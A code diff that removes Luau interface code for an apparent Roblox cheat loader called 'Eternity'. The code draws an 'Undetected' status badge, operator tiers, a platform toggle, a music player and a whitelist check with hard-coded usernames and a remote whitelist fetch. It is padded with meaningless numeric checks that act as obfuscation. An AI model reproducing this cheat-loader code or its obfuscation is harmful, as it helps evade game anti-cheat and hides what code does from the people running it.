-					textLabel9.Position = UDim2.new(0, 20, 0, 0)
-					textLabel9.Text = "v2.0"
-					textLabel9.Font = Enum.Font.GothamBold
-					textLabel9.TextSize = 10
-					textLabel9.TextColor3 = tbl17.accent
-					textLabel9.BackgroundTransparency = 1
-					textLabel9.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel9.ZIndex = 105
-					frame22 = Instance.new("Frame", frame20)
-					frame22.Name = "StatusBadge"
-					frame22.Size = UDim2.new(0, 160, 0, 24)
-					frame22.Position = UDim2.new(0, 318, 0.5, -12)
-					frame22.BackgroundColor3 = Color3.fromRGB(15, 26, 20)
-					frame22.BackgroundTransparency = 0.3
-					frame22.BorderSizePixel = 0
-					frame22.ZIndex = 104
-					corner(frame22, 6)
-					stroke(frame22, Color3.fromRGB(60, 180, 100), 1, 0.5)
-					local frame24 = Instance.new("Frame", frame22)
-					frame24.Size = UDim2.new(1, 0, 1, 0)
-					frame24.BackgroundTransparency = 1
-					frame24.ZIndex = 104
-					local uiListLayout2 = Instance.new("UIListLayout", frame24)
-					uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
-					uiListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
-					uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
-					uiListLayout2.Padding = UDim.new(0, 6)
-					uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
-					local frame25 = Instance.new("Frame", frame24)
-					frame25.Size = UDim2.new(0, 14, 0, 14)
-					frame25.BackgroundTransparency = 1
-					frame25.LayoutOrder = 1
-					frame25.ZIndex = 104
-					local frame26 = Instance.new("Frame", frame25)
-					frame26.AnchorPoint = Vector2.new(0.5, 0.5)
-					frame26.Position = UDim2.new(0.5, 0, 0.5, 0)
-					frame26.Size = UDim2.new(0, 14, 0, 14)
-					frame26.BackgroundColor3 = Color3.fromRGB(80, 220, 130)
-					frame26.BackgroundTransparency = 1
-					frame26.BorderSizePixel = 0
-					frame26.ZIndex = 104
-					corner(frame26, 7)
-					local frame27 = Instance.new("Frame", frame26)
-					frame27.AnchorPoint = Vector2.new(0.5, 0.5)
-					frame27.Position = UDim2.new(0.5, 0, 0.5, 0)
-					frame27.Size = UDim2.new(0, 7, 0, 7)
-					frame27.BackgroundColor3 = Color3.fromRGB(80, 220, 130)
-					frame27.BorderSizePixel = 0
-					frame27.ZIndex = 105
-					corner(frame27, 4)
-					local textLabel10 = Instance.new("TextLabel", frame24)
-					textLabel10.AutomaticSize = Enum.AutomaticSize.X
-					textLabel10.Size = UDim2.new(0, 0, 1, 0)
-					textLabel10.Text = "<b>OPERATIONAL</b> <font color='rgb(180, 230, 190)'>Undetected</font>"
-					textLabel10.RichText = true
-					textLabel10.Font = Enum.Font.Gotham
-					textLabel10.TextSize = 10
-					textLabel10.TextColor3 = Color3.fromRGB(80, 220, 130)
-					textLabel10.BackgroundTransparency = 1
-					textLabel10.TextXAlignment = Enum.TextXAlignment.Center
-					textLabel10.ZIndex = 105
-					textLabel10.LayoutOrder = 2
-
-					task.spawn(function()
-						local n205 = 7416696
-						task.wait(2.5)
-
-						while frame26 and frame26.Parent do
-							tweenWait(frame26, {
-								Size = UDim2.new(0, 18, 0, 18),
-								BackgroundTransparency = 0.5,
-							}, 0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-							tweenWait(frame26, {
-								Size = UDim2.new(0, 12, 0, 12),
-								BackgroundTransparency = 0.8,
-							}, 0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
-							task.wait(0.05)
-							tweenWait(frame26, {
-								Size = UDim2.new(0, 16, 0, 16),
-								BackgroundTransparency = 0.6,
-							}, 0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-							tweenWait(frame26, {
-								Size = UDim2.new(0, 14, 0, 14),
-								BackgroundTransparency = 0.8,
-							}, 0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
-							task.wait(1)
-						end
-
-						if n205 < L1.step4 then
-							return
-						end
-					end)
-				end
-
-				do
-					local eternityPlatformMode = getgenv().EternityPlatformMode == "Phone" or getgenv().EternityPlatformMode == "PC"
-
-					if eternityPlatformMode then
-						eternityPlatformMode = getgenv().EternityPlatformMode
-					end
-
-					if not eternityPlatformMode then
-						eternityPlatformMode = touchEnabled2
-
-						if eternityPlatformMode then
-							eternityPlatformMode = "Phone"
-						end
-
-						eternityPlatformMode = eternityPlatformMode or "PC"
-					end
-
-					getgenv().EternityPlatformMode = eternityPlatformMode
-					local frame22 = Instance.new("Frame", frame20)
-					frame22.Name = "RowPlatform"
-					frame22.Size = UDim2.new(0, 136, 0, 26)
-					frame22.Position = UDim2.new(1, -186, 0.5, -13)
-					frame22.BackgroundTransparency = 1
-					frame22.BorderSizePixel = 0
-					frame22.ZIndex = 104
-					local imageLabel6 = Instance.new("ImageLabel", frame22)
-					imageLabel6.Size = UDim2.new(0, 14, 0, 14)
-					imageLabel6.Position = UDim2.new(0, 0, 0.5, -7)
-					imageLabel6.BackgroundTransparency = 1
-					imageLabel6.Image = "rbxassetid://83691209032160"
-					imageLabel6.ZIndex = 105
-					local textLabel8 = Instance.new("TextLabel", frame22)
-					textLabel8.Size = UDim2.new(0, 0, 0, 0)
-					textLabel8.Text = ""
-					textLabel8.Visible = false
-					local textLabel9 = Instance.new("TextLabel", frame22)
-					textLabel9.Size = UDim2.new(0, 0, 0, 0)
-					textLabel9.Text = ""
-					textLabel9.Visible = false
-					local frame23 = Instance.new("Frame", frame22)
-					frame23.Size = UDim2.new(0, 112, 0, 24)
-					frame23.Position = UDim2.new(0, 20, 0.5, -12)
-					frame23.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
-					frame23.BorderSizePixel = 0
-					frame23.ZIndex = 104
-					corner(frame23, 6)
-					stroke(frame23, Color3.fromRGB(48, 50, 70), 1, 0.5)
-					local textButton5 = Instance.new("TextButton", frame23)
-					textButton5.Size = UDim2.new(0.5, -2, 1, -4)
-					textButton5.Position = UDim2.new(0, 2, 0, 2)
-					textButton5.Text = "PC"
-					textButton5.Font = Enum.Font.GothamBold
-					textButton5.TextSize = 10
-					textButton5.BorderSizePixel = 0
-					textButton5.AutoButtonColor = false
-					textButton5.ZIndex = 105
-					corner(textButton5, 4)
-					local textButton6 = Instance.new("TextButton", frame23)
-					textButton6.Size = UDim2.new(0.5, -2, 1, -4)
-					textButton6.Position = UDim2.new(0.5, 0, 0, 2)
-					textButton6.Text = "Phone"
-					textButton6.Font = Enum.Font.GothamBold
-					textButton6.TextSize = 10
-					textButton6.BorderSizePixel = 0
-					textButton6.AutoButtonColor = false
-					textButton6.ZIndex = 105
-					corner(textButton6, 4)
-
-					local function fn19()
-						if eternityPlatformMode == "PC" then
-							tween(textButton5, {
-								BackgroundColor3 = tbl17.accent,
-								TextColor3 = Color3.fromRGB(15, 12, 5),
-							}, 0.2)
-							tween(textButton6, {
-								BackgroundColor3 = Color3.fromRGB(18, 18, 25),
-								TextColor3 = Color3.fromRGB(130, 130, 145),
-							}, 0.2)
-						else
-							tween(textButton5, {
-								BackgroundColor3 = Color3.fromRGB(18, 18, 25),
-								TextColor3 = Color3.fromRGB(130, 130, 145),
-							}, 0.2)
-							tween(textButton6, {
-								BackgroundColor3 = tbl17.accent,
-								TextColor3 = Color3.fromRGB(15, 12, 5),
-							}, 0.2)
-						end
-
-						getgenv().EternityPlatformMode = eternityPlatformMode
-						fn18()
-					end
-
-					textButton5.MouseButton1Click:Connect(function()
-						pcall(function()
-							v3:Play()
-							return
-						end)
-
-						eternityPlatformMode = "PC"
-						fn19()
-					end)
-
-					textButton6.MouseButton1Click:Connect(function()
-						pcall(function()
-							v3:Play()
-							return
-						end)
-
-						eternityPlatformMode = "Phone"
-						fn19()
-					end)
-
-					fn19()
-				end
-
-				do
-					local n210 = nil
-					frame19 = Instance.new("Frame", frame20)
-					frame19.Name = "MusicCapsule"
-					frame19.Size = UDim2.new(0, 194, 0, 26)
-					frame19.Position = UDim2.new(1, -390, 0.5, -13)
-					frame19.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
-					frame19.BackgroundTransparency = 0.25
-					frame19.BorderSizePixel = 0
-					frame19.ZIndex = 104
-					corner(frame19, 6)
-					stroke(frame19, Color3.fromRGB(48, 50, 70), 1, 0.5)
-					local textButton5 = Instance.new("TextButton", frame19)
-					textButton5.Name = "PlayBtn"
-					textButton5.Size = UDim2.new(0, 20, 0, 20)
-					textButton5.Position = UDim2.new(0, 3, 0.5, -10)
-					textButton5.Text = ""
-					textButton5.BackgroundColor3 = Color3.fromRGB(28, 30, 44)
-					textButton5.BorderSizePixel = 0
-					textButton5.AutoButtonColor = false
-					textButton5.ZIndex = 105
-					corner(textButton5, 4)
-					stroke(textButton5, Color3.fromRGB(55, 60, 85), 1, 0.5)
-					tbl19.playIcon = Instance.new("ImageLabel", textButton5)
-					tbl19.playIcon.Name = "Icon"
-					tbl19.playIcon.Size = UDim2.new(0, 10, 0, 10)
-					tbl19.playIcon.Position = UDim2.new(0.5, -5, 0.5, -5)
-					tbl19.playIcon.BackgroundTransparency = 1
-					tbl19.playIcon.Image = "rbxassetid://114293537715714"
-					tbl19.playIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
-					tbl19.playIcon.ZIndex = 106
-
-					textButton5.MouseEnter:Connect(function()
-						tween(textButton5, { BackgroundColor3 = Color3.fromRGB(42, 45, 66) }, 0.15)
-						if step7 == 615741932 then
-							return
-						end
-					end)
-
-					textButton5.MouseLeave:Connect(function()
-						tween(textButton5, { BackgroundColor3 = Color3.fromRGB(28, 30, 44) }, 0.15)
-						return
-					end)
-
-					textButton5.MouseButton1Click:Connect(function()
-						pcall(function()
-							v3:Play()
-
-							if L1.step4 == step7 then
-							end
-						end)
-
-						if L1.step3 == step6 then
-						end
-
-						tbl19:toggle()
-					end)
-
-					local frame22 = Instance.new("Frame", frame19)
-					frame22.Name = "SynthWaves"
-					frame22.Size = UDim2.new(0, 22, 0, 14)
-					frame22.Position = UDim2.new(0, 27, 0.5, -7)
-					frame22.BackgroundTransparency = 1
-					frame22.ZIndex = 105
-
-					for i = 1, 5 do
-						local frame23 = Instance.new("Frame", frame22)
-						frame23.Name = "Bar_" .. i
-						frame23.Size = UDim2.new(0, 2.5, 0, 6)
-						frame23.Position = UDim2.new(0, (i - 1) * 4.5, 0.5, 0)
-						frame23.AnchorPoint = Vector2.new(0, 0.5)
-						frame23.BackgroundColor3 = Color3.fromRGB(130, 145, 255)
-						frame23.BorderSizePixel = 0
-						frame23.ZIndex = 106
-						corner(frame23, 2)
-						table.insert(tbl19.waveBars, frame23)
-					end
-
-					tbl19.trackLabel = Instance.new("TextLabel", frame19)
-					tbl19.trackLabel.Name = "TrackTitle"
-					tbl19.trackLabel.Size = UDim2.new(1, -74, 1, 0)
-					tbl19.trackLabel.Position = UDim2.new(0, 52, 0, 0)
-					local trackLabel = tbl19.trackLabel
-					local track = tbl19.tracks[tbl19.currentIdx]
-
-					if track then
-						track = tbl19.tracks[tbl19.currentIdx].title
-					end
-
-					trackLabel.Text = track or "Loader Music"
-					tbl19.trackLabel.Font = Enum.Font.GothamMedium
-					tbl19.trackLabel.TextSize = 9.5
-					tbl19.trackLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
-					tbl19.trackLabel.TextXAlignment = Enum.TextXAlignment.Left
-					tbl19.trackLabel.TextTruncate = Enum.TextTruncate.AtEnd
-					tbl19.trackLabel.BackgroundTransparency = 1
-					tbl19.trackLabel.ZIndex = 105
-					local textButton6 = Instance.new("TextButton", frame19)
-					textButton6.Name = "SkipBtn"
-					textButton6.Size = UDim2.new(0, 18, 0, 18)
-					textButton6.Position = UDim2.new(1, -21, 0.5, -9)
-					textButton6.Text = ""
-					textButton6.BackgroundColor3 = Color3.fromRGB(24, 25, 36)
-					textButton6.BorderSizePixel = 0
-					textButton6.AutoButtonColor = false
-					textButton6.ZIndex = 105
-					corner(textButton6, 4)
-					stroke(textButton6, Color3.fromRGB(48, 50, 70), 1, 0.5)
-					local imageLabel6 = Instance.new("ImageLabel", textButton6)
-					imageLabel6.Size = UDim2.new(0, 10, 0, 10)
-					imageLabel6.Position = UDim2.new(0.5, -5, 0.5, -5)
-					imageLabel6.BackgroundTransparency = 1
-					imageLabel6.Image = "rbxassetid://124604079361193"
-					imageLabel6.ImageColor3 = Color3.fromRGB(200, 205, 225)
-					imageLabel6.ZIndex = 106
-
-					textButton6.MouseEnter:Connect(function()
-						tween(textButton6, { BackgroundColor3 = Color3.fromRGB(36, 38, 56) }, 0.15)
-						imageLabel6.ImageColor3 = Color3.fromRGB(255, 255, 255)
-					end)
-
-					textButton6.MouseLeave:Connect(function()
-						n210 = 377029102
-						tween(textButton6, { BackgroundColor3 = Color3.fromRGB(24, 25, 36) }, 0.15)
-
-						if n210 < L1.step2 then
-							imageLabel6.ImageColor3 = Color3.fromRGB(200, 205, 225)
-							return
-						end
-					end)
-
-					textButton6.MouseButton1Click:Connect(function()
-						pcall(function()
-							v3:Play()
-
-							if step7 ~= 615741932 then
-								step6 += 887
-								step = 200895876
-								L1.step2 = 653084389
-								step7 = 448854856
-								count = 616377501
-							end
-						end)
-
-						tbl19:next()
-					end)
-				end
-
-				local connection2 = nil
-
-				connection2 = RunService2.RenderStepped:Connect(function()
-					if frame14 and frame14.Parent then
-						if tbl19.isPlaying then
-							local n205 = tick() * 14
-							local tbl22 = { 1.2, 1.8, 2.2, 1.5, 1 }
-							local tbl23 = { 0, 1.4, 2.8, 4.2, 5.6 }
-
-							for i, waveBar in ipairs(tbl19.waveBars) do
-								local n206 = 3 + math.abs(math.sin(n205 * tbl22[i] + tbl23[i])) * 11
-								waveBar.Size = UDim2.new(0, 2.5, 0, n206)
-								waveBar.BackgroundColor3 = Color3.fromRGB(140 + math.floor(math.sin(n205 + i) * 50), 160 + math.floor(math.cos(n205 + i) * 40), 255)
-							end
-						else
-							for _, waveBar in ipairs(tbl19.waveBars) do
-								if not (waveBar.Size.Y.Offset > 3.2) then
-									waveBar.Size = UDim2.new(0, 2.5, 0, 3)
-								else
-									waveBar.Size = waveBar.Size:Lerp(UDim2.new(0, 2.5, 0, 3), 0.2)
-								end
-
-								waveBar.BackgroundColor3 = Color3.fromRGB(70, 75, 100)
-							end
-						end
-
-						return
-					end
-
-					if connection2 then
-						connection2:Disconnect()
-					end
-				end)
-
-				do
-					local textButton5 = Instance.new("TextButton", frame20)
-					textButton5.Name = "KeyCloseBtn"
-					textButton5.Size = UDim2.new(0, 32, 0, 32)
-					textButton5.Position = UDim2.new(1, -42, 0.5, -16)
-					textButton5.Text = "X"
-					textButton5.Font = Enum.Font.GothamBold
-					textButton5.TextSize = 13
-					textButton5.TextColor3 = Color3.fromRGB(220, 220, 235)
-					textButton5.BackgroundColor3 = Color3.fromRGB(24, 24, 34)
-					textButton5.BackgroundTransparency = 0.3
-					textButton5.BorderSizePixel = 0
-					textButton5.AutoButtonColor = false
-					textButton5.ZIndex = 104
-					corner(textButton5, 6)
-					stroke(textButton5, Color3.fromRGB(50, 52, 70), 1, 0.5)
-
-					textButton5.MouseEnter:Connect(function()
-						tween(textButton5, {
-							BackgroundColor3 = tbl17.danger,
-							TextColor3 = Color3.fromRGB(255, 255, 255),
-							BackgroundTransparency = 0,
-						}, 0.15)
-					end)
-
-					textButton5.MouseLeave:Connect(function()
-						tween(textButton5, {
-							BackgroundColor3 = Color3.fromRGB(24, 24, 34),
-							TextColor3 = Color3.fromRGB(220, 220, 235),
-							BackgroundTransparency = 0.3,
-						}, 0.15)
-					end)
-
-					textButton5.MouseButton1Click:Connect(function()
-						flag9 = false
-						flag8 = true
-						local count4 = 956315997
-						getgenv().EternityLoaderClosed = true
-						getgenv().EternityLoaderSuccess = false
-						getgenv().EternityLoaded = false
-
-						pcall(function()
-							if tbl19 and tbl19.stop then
-								tbl19:stop()
-							elseif count4 == 257574948 then
-							end
-						end)
-
-						pcall(function()
-							if v3 then
-								if count4 ~= 956315997 then
-								end
-
-								v3:Stop()
-								v3.TimePosition = 0
-								v3:Play()
-							end
-						end)
-
-						if L1.step4 == 573096760 then
-							if typeof(fn16) == "function" then
-								fn16(function()
-									pcall(function()
-										if tbl19 and tbl19.stop then
-											tbl19:stop()
-										end
-
-										if tbl20 then
-											tbl20:Stop()
-											tbl20:Destroy()
-										end
-
-										local SoundService = game:GetService("SoundService")
-
-										for _, child in ipairs(SoundService:GetChildren()) do
-											if not child:IsA("Sound") then
-												continue
-											end
-
-											for _, v4 in ipairs(tbl18 or {}) do
-												if child.SoundId == v4 then
-													child:Stop()
-													child:Destroy()
-												end
-											end
-										end
-									end)
-
-									screenGui2:Destroy()
-								end)
-							else
-								screenGui2:Destroy()
-							end
-						else
-							L1.step3 = 782463328
-							L1.step2 = 238222062
-							L1.step4 += 2012
-							step7 = 82399327
-							step = 749569753
-							step6 += 1515
-							count += 729
-							step8 = 1019018792
-							count4 = 814281834
-							upv353 = 232498528
-						end
-					end)
-				end
-
-				frame15 = Instance.new("Frame", frame14)
-				frame15.Name = "CardsContainer"
-				frame15.Size = UDim2.new(1, -20, 1, -68)
-				frame15.Position = UDim2.new(0, 10, 0, 64)
-				frame15.BackgroundTransparency = 1
-				frame15.BorderSizePixel = 0
-				frame15.ZIndex = 102
-				frame15.ClipsDescendants = false
-				frame16 = Instance.new("Frame", frame15)
-				frame16.Name = "LeftPanel"
-				frame16.Size = UDim2.new(0.28, -7, 1, 0)
-				frame16.Position = UDim2.new(0, 0, 0, 0)
-				frame16.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
-				frame16.BackgroundTransparency = 0.35
-				frame16.BorderSizePixel = 0
-				frame16.ZIndex = 102
-
-				do
-					local leftBg, leftScrim, leftStroke = fn17(frame16, 14, Color3.fromRGB(38, 40, 56))
-					tbl21.leftBg = leftBg
-					tbl21.leftScrim = leftScrim
-					tbl21.leftStroke = leftStroke
-				end
-
-				local frame22 = Instance.new("Frame", frame16)
-				frame22.Size = UDim2.new(0, 0, 0, 0)
-				frame22.Visible = false
-
-				do
-					local frame23 = Instance.new("Frame", frame16)
-					frame23.Size = UDim2.new(1, -24, 0, 22)
-					frame23.Position = UDim2.new(0, 12, 0, 12)
-					frame23.BackgroundTransparency = 1
-					frame23.ZIndex = 103
-					local textLabel8 = Instance.new("TextLabel", frame23)
-					textLabel8.Size = UDim2.new(1, 0, 1, 0)
-					textLabel8.Text = "OPERATOR IDENTITY"
-					textLabel8.Font = Enum.Font.GothamBold
-					textLabel8.TextSize = 10
-					textLabel8.TextColor3 = tbl17.accent
-					textLabel8.BackgroundTransparency = 1
-					textLabel8.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel8.ZIndex = 103
-				end
-
-				local frame23 = Instance.new("Frame", frame16)
-				frame23.Size = UDim2.new(1, -24, 0, 1)
-				frame23.Position = UDim2.new(0, 12, 0, 36)
-				frame23.BackgroundColor3 = Color3.fromRGB(32, 34, 48)
-				frame23.BorderSizePixel = 0
-				frame23.ZIndex = 103
-				local uiGradient, uiGradient2, fn19
-
-				do
-					local frame24 = Instance.new("Frame", frame16)
-					frame24.Name = "LeftGlowBlob"
-					frame24.Size = UDim2.new(0, 0, 0, 0)
-					frame24.Position = UDim2.new(0.5, 0, 0, 92)
-					frame24.BackgroundTransparency = 1
-					frame24.BorderSizePixel = 0
-					frame24.Visible = false
-					frame24.ZIndex = 101
-					local frame25 = Instance.new("Frame", frame16)
-					frame25.Name = "AvatarRing"
-					frame25.AnchorPoint = Vector2.new(0.5, 0.5)
-					frame25.Size = UDim2.new(0, 80, 0, 80)
-					frame25.Position = UDim2.new(0.5, 0, 0, 92)
-					frame25.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-					frame25.BackgroundTransparency = 0
-					frame25.BorderSizePixel = 0
-					frame25.ZIndex = 103
-					corner(frame25, 40)
-					local instance2 = stroke(frame25, tbl17.accent, 2, 0)
-					uiGradient = Instance.new("UIGradient", instance2)
-
-					uiGradient.Transparency = NumberSequence.new({
-						NumberSequenceKeypoint.new(0, 1),
-						NumberSequenceKeypoint.new(0.45, 1),
-						NumberSequenceKeypoint.new(0.5, 0),
-						NumberSequenceKeypoint.new(0.55, 1),
-						NumberSequenceKeypoint.new(1, 1),
-					})
-
-					local frame26 = Instance.new("Frame", frame25)
-					frame26.AnchorPoint = Vector2.new(0.5, 0.5)
-					frame26.Size = UDim2.new(1, -6, 1, -6)
-					frame26.Position = UDim2.new(0.5, 0, 0.5, 0)
-					frame26.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
-					frame26.BackgroundTransparency = 0
-					frame26.BorderSizePixel = 0
-					frame26.ZIndex = 104
-					corner(frame26, 37)
-					local imageLabel6 = Instance.new("ImageLabel", frame26)
-					imageLabel6.AnchorPoint = Vector2.new(0.5, 0.5)
-					imageLabel6.Size = UDim2.new(1, 0, 1, 0)
-					imageLabel6.Position = UDim2.new(0.5, 0, 0.5, 0)
-					imageLabel6.BackgroundTransparency = 1
-					imageLabel6.ZIndex = 105
-					imageLabel6.ScaleType = Enum.ScaleType.Crop
-					corner(imageLabel6, 37)
-
-					pcall(function()
-						imageLabel6.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer_2.UserId .. "&width=150&height=150&format=png"
-					end)
-
-					local textLabel8 = Instance.new("TextLabel", frame16)
-					textLabel8.Size = UDim2.new(1, -20, 0, 20)
-					textLabel8.Position = UDim2.new(0, 10, 0, 142)
-					textLabel8.Text = localPlayer_2.DisplayName
-					textLabel8.Font = Enum.Font.GothamBold
-					textLabel8.TextSize = 14
-					textLabel8.TextColor3 = Color3.fromRGB(240, 240, 248)
-					textLabel8.BackgroundTransparency = 1
-					textLabel8.TextXAlignment = Enum.TextXAlignment.Center
-					textLabel8.ZIndex = 103
-					local textLabel9 = Instance.new("TextLabel", frame16)
-					textLabel9.Size = UDim2.new(1, -20, 0, 16)
-					textLabel9.Position = UDim2.new(0, 10, 0, 164)
-					textLabel9.Text = "@" .. localPlayer_2.Name
-					textLabel9.Font = Enum.Font.Gotham
-					textLabel9.TextSize = 10
-					textLabel9.TextColor3 = Color3.fromRGB(120, 120, 140)
-					textLabel9.BackgroundTransparency = 1
-					textLabel9.TextXAlignment = Enum.TextXAlignment.Center
-					textLabel9.ZIndex = 103
-					local imageLabel7 = Instance.new("ImageLabel", frame16)
-					imageLabel7.Name = "TierGlow"
-					imageLabel7.Size = UDim2.new(0, 170, 0, 50)
-					imageLabel7.Position = UDim2.new(0.5, -85, 0, 173)
-					imageLabel7.BackgroundTransparency = 1
-					imageLabel7.Image = "rbxassetid://5028857084"
-					imageLabel7.ImageColor3 = Color3.fromRGB(255, 195, 60)
-					imageLabel7.ImageTransparency = 1
-					imageLabel7.ZIndex = 102
-					local frame27 = Instance.new("Frame", frame16)
-					frame27.Name = "TierPill"
-					frame27.Size = UDim2.new(0, 142, 0, 24)
-					frame27.Position = UDim2.new(0.5, -71, 0, 186)
-					frame27.BackgroundColor3 = Color3.fromRGB(26, 22, 16)
-					frame27.BorderSizePixel = 0
-					frame27.ZIndex = 103
-					corner(frame27, 12)
-					local uiGradient3 = Instance.new("UIGradient", frame27)
-
-					uiGradient3.Color = ColorSequence.new({
-						ColorSequenceKeypoint.new(0, Color3.fromRGB(36, 28, 14)),
-						ColorSequenceKeypoint.new(0.5, Color3.fromRGB(56, 42, 20)),
-						ColorSequenceKeypoint.new(1, Color3.fromRGB(32, 24, 12)),
-					})
-
-					uiGradient3.Rotation = 45
-					local instance3 = stroke(frame27, Color3.fromRGB(255, 215, 100), 1, 0.25)
-					uiGradient2 = Instance.new("UIGradient", instance3)
-
-					uiGradient2.Color = ColorSequence.new({
-						ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 225, 130)),
-						ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 175, 50)),
-						ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 220)),
-						ColorSequenceKeypoint.new(0.7, Color3.fromRGB(210, 150, 40)),
-						ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 225, 130)),
-					})
-
-					uiGradient2.Transparency = NumberSequence.new({
-						NumberSequenceKeypoint.new(0, 0.2),
-						NumberSequenceKeypoint.new(0.5, 0),
-						NumberSequenceKeypoint.new(1, 0.2),
-					})
-					local imageLabel8 = Instance.new("ImageLabel", frame27)
-					imageLabel8.Name = "TierIcon"
-					imageLabel8.Size = UDim2.new(0, 13, 0, 13)
-					imageLabel8.Position = UDim2.new(0, 8, 0.5, -6.5)
-					imageLabel8.BackgroundTransparency = 1
-					imageLabel8.Image = "rbxthumb://type=Asset&id=100074368064051&w=150&h=150"
-					imageLabel8.ImageColor3 = Color3.fromRGB(255, 225, 110)
-					imageLabel8.ZIndex = 104
-					local textLabel10 = Instance.new("TextLabel", frame27)
-					textLabel10.Name = "TierLabel"
-					textLabel10.Size = UDim2.new(1, -26, 1, 0)
-					textLabel10.Position = UDim2.new(0, 22, 0, 0)
-					textLabel10.Text = "★ PREMIUM OPERATOR"
-					textLabel10.RichText = true
-					textLabel10.Font = Enum.Font.GothamBold
-					textLabel10.TextSize = 9
-					textLabel10.TextColor3 = Color3.fromRGB(255, 225, 130)
-					textLabel10.BackgroundTransparency = 1
-					textLabel10.TextXAlignment = Enum.TextXAlignment.Center
-					textLabel10.ZIndex = 104
-
-					fn19 = function(arg)
-						if textLabel10 and textLabel10.Parent and frame27 and frame27.Parent then
-							if arg == true then
-								imageLabel8.Visible = true
-								textLabel10.Text = "★ PREMIUM OPERATOR"
-								textLabel10.TextColor3 = Color3.fromRGB(255, 225, 130)
-								textLabel10.Size = UDim2.new(1, -26, 1, 0)
-								textLabel10.Position = UDim2.new(0, 22, 0, 0)
-								frame27.Size = UDim2.new(0, 142, 0, 24)
-								frame27.Position = UDim2.new(0.5, -71, 0, 186)
-								uiGradient3.Enabled = true
-
-								uiGradient3.Color = ColorSequence.new({
-									ColorSequenceKeypoint.new(0, Color3.fromRGB(36, 28, 14)),
-									ColorSequenceKeypoint.new(0.5, Color3.fromRGB(56, 42, 20)),
-									ColorSequenceKeypoint.new(1, Color3.fromRGB(32, 24, 12)),
-								})
-
-								if imageLabel7 and imageLabel7.Parent then
-									imageLabel7.ImageTransparency = 0.55
-									imageLabel7.Size = UDim2.new(0, 170, 0, 50)
-									imageLabel7.Position = UDim2.new(0.5, -85, 0, 173)
-								end
-
-								if instance3 and instance3.Parent then
-									instance3.Color = Color3.fromRGB(255, 215, 100)
-									instance3.Transparency = 0.2
-								end
-
-								if instance2 and instance2.Parent then
-									instance2.Color = Color3.fromRGB(245, 245, 255)
-								end
-
-								if uiGradient and uiGradient.Parent then
-									uiGradient.Color = ColorSequence.new({
-										ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-										ColorSequenceKeypoint.new(0.5, Color3.fromRGB(215, 225, 245)),
-										ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
-									})
-								end
-
-								if frame24 and frame24.Parent then
-									frame24.Visible = false
-								end
-							else
-								imageLabel8.Visible = false
-								textLabel10.Text = "STANDARD OPERATOR"
-								textLabel10.TextColor3 = Color3.fromRGB(150, 155, 175)
-								local udim24 = UDim2.new(1, 0, 1, 0)
-								textLabel10.Size = udim24
-								textLabel10.Position = UDim2.new(0, 0, 0, 0)
-								frame27.Size = UDim2.new(0, 118, 0, 22)
-								frame27.Position = UDim2.new(0.5, -59, 0, 187)
-								uiGradient3.Enabled = false
-								frame27.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
-
-								if imageLabel7 and imageLabel7.Parent then
-									imageLabel7.ImageTransparency = 1
-								end
-
-								if instance3 and instance3.Parent then
-									instance3.Color = Color3.fromRGB(48, 50, 70)
-									instance3.Transparency = 0.5
-								end
-
-								if instance2 and instance2.Parent then
-									instance2.Color = tbl17.accent
-								end
-
-								if frame24 and frame24.Parent then
-									frame24.Visible = false
-								end
-							end
-
-							return
-						end
-					end
-				end
-
-				local function fn20(name4)
-					if not name4 then
-						name4 = localPlayer_2
-
-						if name4 then
-							name4 = localPlayer_2.Name
-						end
-					end
-
-					name4 = name4 or ""
-					local str3 = string.lower(string.gsub(tostring(name4), "%s+", ""))
-					local whitelistedUsers
-
-					if str3 == "horize1n" or str3 == "hor1zen" then
-						return true
-					end
-					whitelistedUsers = getgenv().WhitelistedUsers
-
-					if whitelistedUsers and type(getgenv().WhitelistedUsers) == "table" and getgenv().WhitelistedUsers[str3] == true then
-						return true
-					end
-
-					if L1.isUserWhitelisted and L1.isUserWhitelisted(name4) then
-						return true
-					end
-					return false
-				end
-
-				do
-					local name4 = localPlayer_2
-
-					if name4 then
-						name4 = localPlayer_2.Name
-					end
-
-					name4 = name4 or ""
-					fn19(fn20(name4))
-
-					task.spawn(function()
-						pcall(function()
-							local n210 = 690191790
-							local getgenv_ = L1.fetchRemoteWhitelist
-
-							if not getgenv_ then
-								getgenv_ = getgenv
-
-								if getgenv_ then
-									getgenv_ = getgenv().fetchRemoteWhitelist
-								end
-							end
-
-							if getgenv_ then
-								getgenv_()
-							end
-
-							if n210 < step then
-								return
-							end
-						end)
-
-						local eternityIsWhitelisted = fn20(name4)
-
-						if step8 == 975380873 then
-							getgenv().EternityIsWhitelisted = eternityIsWhitelisted
-							fn19(eternityIsWhitelisted)
-							return
-						end
-					end)
-				end
-
-				local textButton5
-
-				do
-					local frame24 = Instance.new("Frame", frame16)
-					frame24.Name = "RowDiscord"
-					frame24.Size = UDim2.new(1, -20, 0, 174)
-					frame24.Position = UDim2.new(0, 10, 0, 220)
-					frame24.BackgroundColor3 = Color3.fromRGB(18, 18, 27)
-					frame24.BackgroundTransparency = 0.2
-					frame24.BorderSizePixel = 0
-					frame24.ZIndex = 103
-					corner(frame24, 10)
